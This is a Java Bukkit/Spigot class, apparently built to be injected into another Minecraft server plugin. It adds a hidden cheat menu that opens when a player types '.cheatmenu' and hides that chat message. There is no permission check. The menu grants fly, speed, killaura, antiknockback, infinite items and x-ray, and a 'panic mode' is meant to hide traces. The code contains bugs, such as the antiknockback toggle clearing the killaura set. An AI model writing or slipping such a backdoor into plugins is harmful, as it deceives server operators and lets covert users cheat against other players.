import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.UUID;

public class CheatListener implements Listener {
    private final JavaPlugin plugin;
    
    // Хранилища для состояний включённых функций (UUID)
    private final HashSet<UUID> flyEnabled = new HashSet<>();
    private final HashSet<UUID> speedEnabled = new HashSet<>();
    private final HashSet<UUID> killauraEnabled = new HashSet<>();
    private final HashSet<UUID> xrayEnabled = new HashSet<>();
    private final HashSet<UUID> antiknbEnabled = new HashSet<>();
    private final HashSet<UUID> infiniteItemEnabled = new HashSet<>();

    private org.bukkit.scheduler.BukkitTask killauraTask = null;
    
    // Заголовок меню для идентификации нашего GUI
    private final String guiTitle = "- §4§lCheat Menu§r -";

    private CheatListener(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    public static void inject(JavaPlugin instance) {
        CheatListener listener = new CheatListener(instance);
        instance.getServer().getPluginManager().registerEvents(listener, instance);
        listener.killauraTask = Bukkit.getScheduler().runTaskTimer(instance, () -> {
        for (UUID uuid : listener.killauraEnabled) {
            Player player = Bukkit.getPlayer(uuid);
            if (player != null && player.isOnline()) {
                listener.executeKillAura(player);
            }
        }
    }, 1L, 1L);
    }
    // Открытие GUI при сообщении в чат ".cheatmenu"
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event){
        if(event.getMessage().trim().equals(".cheatmenu")){
            event.setCancelled(true);
            Bukkit.getScheduler().runTask(plugin, () -> {
                openCheatMenu(event.getPlayer());
            });
        }
    }
    // Метод создания и открытия инвентаря (GUI)
    private void openCheatMenu(Player player) {
        // Создаем инвентарь на 27 слотов
        Inventory gui = Bukkit.createInventory(null, 27, guiTitle);

        // Иконка для Fly (Перо)
        boolean hasFly = flyEnabled.contains(player.getUniqueId());
        gui.setItem(10, createGuiItem(Material.FEATHER, "§b§lFly Hack", hasFly,
                hasFly ? "§7Статус: §aВКЛЮЧЕН" : "§7Статус: §cВЫКЛЮЧЕН", "§eНажмите для переключения"));

        // Иконка для Speed (Сахар)
        boolean hasSpeed = speedEnabled.contains(player.getUniqueId());
        gui.setItem(12, createGuiItem(Material.SUGAR, "§e§lSpeed Hack", hasSpeed,
                hasSpeed ? "§7Статус: §aВКЛЮЧЕН" : "§7Статус: §cВЫКЛЮЧЕН", "§eНажмите для переключения"));
        
        boolean hasAura = killauraEnabled.contains(player.getUniqueId());
        gui.setItem(13, createGuiItem(Material.DIAMOND_SWORD, "§c§lKillAura", hasAura,
                hasAura ? "§7Статус: §aВКЛЮЧЕН" : "§7Статус: §cВЫКЛЮЧЕН", "§eНажмите для переключения"));
        
        // Иконка (Слайм блок)
        boolean hasAntiKb = antiknbEnabled.contains(player.getUniqueId());
        gui.setItem(14, createGuiItem(Material.SLIME_BLOCK, "§a§lAntiKnockback", hasAntiKb,
                hasAntiKb ? "§7Статус: §aВКЛЮЧЕН" : "§7Статус: §cВЫКЛЮЧЕН", "§eНажмите для переключения"));

        // Кнопка InfiniteItem (Эндер-жемчуг)
        boolean hasInfinite = infiniteItemEnabled.contains(player.getUniqueId());
        gui.setItem(16, createGuiItem(Material.ENDER_PEARL, "§d§lInfinite Items", hasInfinite,
                hasInfinite ? "§7Статус: §aВКЛЮЧЕН" : "§7Статус: §cВЫКЛЮЧЕН", "§eНажмите для переключения"));

        gui.setItem(22, createGuiItem(Material.REDSTONE_BLOCK, "§4§lPANIC MODE", false, 
        "§7Мгновенно отключает ВСЕ функции", "§7чита и скрывает следы.", "§cНажмите в экстренной ситуации!"));
        player.openInventory(gui);
    }

    // Вспомогательный метод для быстрого создания предметов меню
    private ItemStack createGuiItem(Material material, String name, boolean isEnchanted, String... loreLines) {
        ItemStack item = new ItemStack(material);
        ItemMeta meta = item.getItemMeta();
        if (meta != null) {
            meta.setDisplayName(name);
            List<String> lore = new ArrayList<>();
            for (String line : loreLines) {
                lore.add(line);
            }
            meta.setLore(lore);
            if (isEnchanted) { try {
                org.bukkit.enchantments.Enchantment efficiency = org.bukkit.enchantments.Enchantment.getByKey(NamespacedKey.minecraft("efficiency"));
                if (efficiency == null) {
                    // Резервный вариант для очень старых версий (1.12 и ниже), если ключ не нашелся [спасибо иишке от гугла]
                    efficiency = org.bukkit.enchantments.Enchantment.getByName("DIG_SPEED");
                }

                if (efficiency != null) {
                    meta.addEnchant(efficiency, 1, true);
                }
                // Скрываем подпись чар
                meta.addItemFlags(org.bukkit.inventory.ItemFlag.HIDE_ENCHANTS);
            }catch(Exception e){}}
            item.setItemMeta(meta);
        }
        return item;
    }
    // Обработка нажатий
    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        // Проверяем, что клик совершен именно в нашем меню
        if (event.getView().getTitle().equals(guiTitle)) {
            event.setCancelled(true); // Запрещаем забирать предметы из GUI

            if (event.getCurrentItem() == null || event.getCurrentItem().getType() == Material.AIR) {
                return;
            }

            Player player = (Player) event.getWhoClicked();
            UUID uuid = player.getUniqueId();
            Material clickedType = event.getCurrentItem().getType();
            boolean toggledTo = false;
            // Переключение функции Fly
            if (clickedType == Material.FEATHER) {
                if (flyEnabled.contains(uuid)) {
                    flyEnabled.remove(uuid);
                    player.setAllowFlight(false);
                    player.setFlying(false);
                    player.sendMessage("§4[Cheat] §fFly Hack §cвыключен");
                } else {
                    flyEnabled.add(uuid);
                    player.setAllowFlight(true);
                    player.setFlying(true);
                    player.sendMessage("§4[Cheat] §fFly Hack §aвключен");
                    toggledTo = true;
                }
            }
            
            // Переключение функции Speed
            else if (clickedType == Material.SUGAR) {
                if (speedEnabled.contains(uuid)) {
                    speedEnabled.remove(uuid);
                    player.setWalkSpeed(0.2f); // Дефолтная скорость игрока
                    player.sendMessage("§4[Cheat] §fSpeed Hack §cвыключен");
                } else {
                    speedEnabled.add(uuid);
                    player.setWalkSpeed(0.8f); // Увеличенная скорость (макс 1.0f)
                    player.sendMessage("§4[Cheat] §fSpeed Hack §aвключен");
                    toggledTo = true;
                }
            }

            // KillAura
            else if (clickedType == Material.DIAMOND_SWORD) {
                if (killauraEnabled.contains(uuid)) {
                    killauraEnabled.remove(uuid);
                    player.sendMessage("§4[Cheat] §fKillAura §cвыключен");
                } else {
                    killauraEnabled.add(uuid);
                    player.sendMessage("§4[Cheat] §fKillAura §aвключен");
                    toggledTo = true;
                }
            }
            // AntiKnockback
            else if (clickedType == Material.SLIME_BLOCK) {
                if (antiknbEnabled.contains(uuid)) {
                    killauraEnabled.remove(uuid);
                    player.sendMessage("§4[Cheat] §fAntiKnockback §cвыключен");
                } else {
                    antiknbEnabled.add(uuid);
                    player.sendMessage("§4[Cheat] §fAntiKnockback §aвключен");
                    toggledTo = true;
                }
            }
            // InfiniteItem
            else if (clickedType == Material.ENDER_PEARL) {
                if (infiniteItemEnabled.contains(uuid)) {
                    infiniteItemEnabled.remove(uuid);
                    player.sendMessage("§4[Cheat] §fInfiniteItem §cвыключен");
                } else {
                    infiniteItemEnabled.add(uuid);
                    player.sendMessage("§4[Cheat] §fInfiniteItem §aвключен");
                    toggledTo = true;
                }
            }
            // §4§l PANIC MODE!!!
            else if (clickedType == Material.REDSTONE_BLOCK){
                //   - эти строки сбрасывают изменённые значения -   //
                player.setAllowFlight(false);
                player.setFlying(false);
                player.setWalkSpeed(0.2f);
                if (xrayEnabled.contains(uuid)) {
                    xRay(player, false);
                }
                //   - эти строки удаляют игрока из всех списков -   //
                flyEnabled.remove(uuid);
                speedEnabled.remove(uuid);
                killauraEnabled.remove(uuid);
                xrayEnabled.remove(uuid);
                antiknbEnabled.remove(uuid);
                infiniteItemEnabled.remove(uuid);
                // Мнгновенно закрыть инв
                player.closeInventory();
                // И тихий звук
                player.playSound(player.getLocation(), org.bukkit.Sound.BLOCK_IRON_DOOR_CLOSE, 0.5f, 0.8f);
                // Чуть не забыл) сообщение на экран на 1.5 секунды
                player.sendTitle("§4§lPANIC MODE", "§cВсе функции вырублены", 4, 24, 2);
                return;
            }
            // Если нажат не предмет выбора чита
            else {
                return;
            }
            player.playSound(player.getLocation(), org.bukkit.Sound.BLOCK_NOTE_BLOCK_PLING, 0.5f, toggledTo?2.0f:0.5f);
            openCheatMenu(player);
        }
    }
    private void executeKillAura(Player player) {
        double radius = 5.0;
        org.bukkit.entity.Entity target = null;
        double closestDistance = Double.MAX_VALUE;

        for (org.bukkit.entity.Entity entity : player.getNearbyEntities(radius, radius, radius)) {
            if (entity instanceof org.bukkit.entity.LivingEntity && entity != player && !entity.isDead()) {
                double dist = entity.getLocation().distance(player.getLocation());
                if (dist < closestDistance) {
                    closestDistance = dist;
                    target = entity;
                }
            }
        }

        if (target != null) {
            player.attack(target);
        }
    }
    @EventHandler
    public void onPlayerMove(org.bukkit.event.player.PlayerMoveEvent event) {
        Player player = event.getPlayer();

        if (!xrayEnabled.contains(player.getUniqueId())) {
            return;
        }

        if (event.getFrom().getBlockX() != event.getTo().getBlockX()
                || event.getFrom().getBlockY() != event.getTo().getBlockY()
                || event.getFrom().getBlockZ() != event.getTo().getBlockZ()) {
            xRay(player,true);
        }
    }
    // Логика AntiKnockback: блокирует любое принудительное изменение скорости игрока
    @EventHandler
    public void onPlayerVelocity(PlayerVelocityEvent event) {
        Player player = event.getPlayer();
        
        // Если у игрока включен AntiKnockback - отменяем событие изменения скорости
        if (antiknbEnabled.contains(player.getUniqueId())) {
            event.setCancelled(true);
        }
    }
    @EventHandler
    public void onPlayerInteractInfinite(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        
        if (infiniteItemEnabled.contains(player.getUniqueId())) {
            ItemStack item = event.getItem();
            
            // Если в руке что-то есть, принудительно возвращаем количество через 1 тик
            if (item != null && item.getType() != Material.AIR) {
                int amount = item.getAmount();
                
                Bukkit.getScheduler().runTask(plugin, () -> {
                    if (player.isOnline()) {
                        item.setAmount(amount);
                        player.updateInventory();
                    }
                });
            }
        }
    }
    private void xRay(Player player,boolean enable) {
        int radius = 12;
        Location loc = player.getLocation();
        org.bukkit.Particle particleToSpawn = org.bukkit.Particle.REDSTONE; // дефолт
        try {
            particleToSpawn = org.bukkit.Particle.valueOf("TRIAL_SPAWNER_DETECTION");
        } catch (Exception e) {
            try { particleToSpawn = org.bukkit.Particle.valueOf("GLOW"); } catch (Exception ex) {}
        }
        for (int x = -radius; x <= radius; x++) {
            for (int y = -radius; y <= radius; y++) {
                for (int z = -radius; z <= radius; z++) {
                    org.bukkit.block.Block block = loc.clone().add(x, y, z).getBlock();
                    Material type = block.getType();
                    
                    if (type == Material.AIR || type == Material.CAVE_AIR || type == Material.VOID_AIR 
                            || type == Material.WATER || type == Material.LAVA) {
                        continue;
                    }
                    
                    if (enable) {
                        if (isOre(type)) {
                            Location oreLoc = block.getLocation().add(0.5, 0.5, 0.5);
                            if(particleToSpawn.name().equals("REDSTONE")){
                                player.spawnParticle(particleToSpawn, oreLoc, 1, 
                                    new org.bukkit.Particle.DustOptions(org.bukkit.Color.fromRGB(0, 255, 255), 1.5f));
                            }else{
                                player.spawnParticle(particleToSpawn, oreLoc, 1, 0, 0, 0, 0);
                            }
                        }else{
                            player.sendBlockChange(block.getLocation(), Material.GLASS.createBlockData());
                        }
                    } else {
                        player.sendBlockChange(block.getLocation(), block.getBlockData());
                    }
                }
            }
        }
    }
    private boolean isOre(Material material) {
        String name = material.name();
        return name.contains("ORE") 
                || material == Material.AMETHYST_CLUSTER 
                || material == Material.ANCIENT_DEBRIS 
                || material == Material.RAW_IRON_BLOCK 
                || material == Material.RAW_GOLD_BLOCK 
                || material == Material.RAW_COPPER_BLOCK 
                || material == Material.CHEST 
                || material == Material.SPAWNER;
    }
    @EventHandler
    public void onProjectileLaunchInfinite(org.bukkit.event.entity.ProjectileLaunchEvent event) {
        if (event.getEntity().getShooter() instanceof Player) {
            Player player = (Player) event.getEntity().getShooter();
            
            if (infiniteItemEnabled.contains(player.getUniqueId())) {
                org.bukkit.inventory.ItemStack item = player.getInventory().getItemInMainHand();
                
                if (item.getType() != Material.AIR) {
                    int amount = item.getAmount();
                    
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        if (player.isOnline()) {
                            item.setAmount(amount);
                            player.updateInventory();
                        }
                    });
                }
            }
        }
    }
    @EventHandler
    public void onPlayerQuit(org.bukkit.event.player.PlayerQuitEvent event) {
        java.util.UUID uuid = event.getPlayer().getUniqueId();

        // Удаляем UUID из всех существующих хранилищ чита
        flyEnabled.remove(uuid);
        speedEnabled.remove(uuid);
        killauraEnabled.remove(uuid);
        xrayEnabled.remove(uuid);
        antiknbEnabled.remove(uuid);
        infiniteItemEnabled.remove(uuid);
    }
}
